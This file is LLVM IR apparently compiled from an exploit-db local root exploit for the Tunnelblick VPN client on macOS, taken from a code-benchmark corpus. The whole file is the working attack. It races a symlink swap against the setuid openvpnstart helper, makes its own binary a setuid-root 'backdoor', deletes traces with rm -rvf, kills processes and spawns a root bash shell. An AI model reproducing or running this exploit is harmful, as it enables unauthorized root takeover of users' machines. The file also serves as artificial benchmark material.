; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_20417.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_20417.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [89 x i8] c"%s/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"%s/exploit.pid\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"PWNPATH\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"[+] Making backdoor.\0A\00", align 1
@S_ISUID = common dso_local global i32 0, align 4
@S_IXOTH = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [18 x i8] c"[+] Cleaning up.\0A\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"%d %d\00", align 1
@.str.8 = private unnamed_addr constant [23 x i8] c"rm -rvf '%s/../../../'\00", align 1
@.str.9 = private unnamed_addr constant [43 x i8] c"[+] Complete. Run this again to get root.\0A\00", align 1
@.str.10 = private unnamed_addr constant [19 x i8] c"[+] Getting root.\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.13 = private unnamed_addr constant [36 x i8] c"[+] Creating vulnerable directory.\0A\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"mkdir -p -v '%s'\00", align 1
@.str.15 = private unnamed_addr constant [22 x i8] c"[+] Running toggler.\0A\00", align 1
@.str.16 = private unnamed_addr constant [16 x i8] c"%s/connected.sh\00", align 1
@.str.17 = private unnamed_addr constant [76 x i8] c"/Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh\00", align 1
@.str.18 = private unnamed_addr constant [51 x i8] c"[+] Writing pid and executing vulnerable program.\0A\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.20 = private unnamed_addr constant [62 x i8] c"/Applications/Tunnelblick.app/Contents/Resources/openvpnstart\00", align 1
@.str.21 = private unnamed_addr constant [13 x i8] c"openvpnstart\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"pwnage.tblk\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"0\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [512 x i8], align 16
  %7 = alloca [512 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca [512 x i8], align 16
  %10 = alloca [512 x i8], align 16
  %11 = alloca [512 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %17 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @snprintf(i8* %16, i32 512, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %21 = call i32 @snprintf(i8* %19, i32 512, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %23 = icmp ne i8* %22, null
  br i1 %23, label %24, label %28

24:                                               ; preds = %2
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %26 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %27 = call i32 @strcpy(i8* %25, i8* %26)
  br label %36

28:                                               ; preds = %2
  store i32 512, i32* %12, align 4
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %30 = call i32 @_NSGetExecutablePath(i8* %29, i32* %12)
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %33 = call i32 @realpath(i8* %31, i8* %32)
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %35 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %34, i32 1)
  br label %36

36:                                               ; preds = %28, %24
  %37 = call i32 (...) @geteuid()
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %73, label %39

39:                                               ; preds = %36
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %41 = call i32* @fopen(i8* %40, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %41, i32** %15, align 8
  %42 = load i32*, i32** %15, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %44, label %68

44:                                               ; preds = %39
  %45 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %47 = call i32 @chown(i8* %46, i32 0, i32 0)
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %49 = load i32, i32* @S_ISUID, align 4
  %50 = load i32, i32* @S_IXOTH, align 4
  %51 = or i32 %49, %50
  %52 = call i32 @chmod(i8* %48, i32 %51)
  %53 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  %54 = load i32*, i32** %15, align 8
  %55 = call i32 @fscanf(i32* %54, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i32* %13, i32* %14)
  %56 = load i32*, i32** %15, align 8
  %57 = call i32 @fclose(i32* %56)
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %60 = call i32 @snprintf(i8* %58, i32 512, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0), i8* %59)
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %62 = call i32 @system(i8* %61)
  %63 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.9, i64 0, i64 0))
  %64 = load i32, i32* %14, align 4
  %65 = call i32 @kill(i32 %64, i32 9)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @kill(i32 %66, i32 9)
  ret i32 0

68:                                               ; preds = %39
  %69 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %70 = call i32 @setuid(i32 0)
  %71 = call i32 @setgid(i32 0)
  %72 = call i32 (i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* null)
  br label %73

73:                                               ; preds = %68, %36
  %74 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.13, i64 0, i64 0))
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %77 = call i32 @snprintf(i8* %75, i32 512, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i64 0, i64 0), i8* %76)
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %79 = call i32 @system(i8* %78)
  %80 = call i32 (...) @fork()
  store i32 %80, i32* %13, align 4
  %81 = load i32, i32* %13, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %98, label %83

83:                                               ; preds = %73
  %84 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0))
  %85 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %86 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %87 = call i32 @snprintf(i8* %85, i32 512, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.16, i64 0, i64 0), i8* %86)
  br label %88

88:                                               ; preds = %88, %83
  %89 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %90 = call i32 @unlink(i8* %89)
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %92 = call i32 @symlink(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.17, i64 0, i64 0), i8* %91)
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %94 = call i32 @unlink(i8* %93)
  %95 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %97 = call i32 @symlink(i8* %95, i8* %96)
  br label %88

98:                                               ; preds = %73
  %99 = call i32 @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.18, i64 0, i64 0))
  %100 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %101 = call i32* @fopen(i8* %100, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store i32* %101, i32** %15, align 8
  %102 = load i32*, i32** %15, align 8
  %103 = load i32, i32* %13, align 4
  %104 = call i32 (...) @getpid()
  %105 = call i32 @fprintf(i32* %102, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i32 %103, i32 %104)
  %106 = load i32*, i32** %15, align 8
  %107 = call i32 @fclose(i32* %106)
  br label %108

108:                                              ; preds = %117, %98
  %109 = call i32 (...) @fork()
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %111, label %113

111:                                              ; preds = %108
  %112 = call i32 @wait(i32* null)
  br label %117

113:                                              ; preds = %108
  %114 = call i32 @close(i32 0)
  %115 = call i32 @close(i32 2)
  %116 = call i32 (i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i64 0, i64 0), i8* null)
  br label %117

117:                                              ; preds = %113, %111
  br label %108
}

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @_NSGetExecutablePath(i8*, i32*) #1

declare dso_local i32 @realpath(i8*, i8*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @geteuid(...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @fscanf(i32*, i8*, i32*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @setgid(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, ...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @symlink(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
